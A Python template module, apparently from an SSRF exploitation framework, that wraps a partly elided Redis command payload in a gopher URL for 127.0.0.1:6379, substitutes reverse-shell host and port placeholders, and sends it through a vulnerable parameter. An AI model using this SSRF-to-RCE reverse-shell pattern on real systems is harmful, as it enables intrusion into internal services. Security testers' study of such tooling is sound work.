from core.utils import *
import logging

name          = "servicename in lowercase"
description   = "ServiceName RCE - What does it do"
author        = "Name or pseudo of the author"
documentation = ["http://link_to_a_research", "http://another_link"]

class exploit():

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # Data for the service
        ip   = "127.0.0.1"
        port = "6379"
        data = "*1%0d%0a$8%0d%0af[...]save%0d%0aquit%0d%0a"
        payload = wrapper_gopher(data, ip , port)

        # Handle args for reverse shell
        if args.lhost == None: payload = payload.replace("SERVER_HOST", input("Server Host:"))
        else:                  payload = payload.replace("SERVER_HOST", args.lhost)

        if args.lport == None: payload = payload.replace("SERVER_PORT", input("Server Port:"))
        else:                  payload = payload.replace("SERVER_PORT", args.lport)

        # Send the payload
        r = requester.do_request(args.param, payload)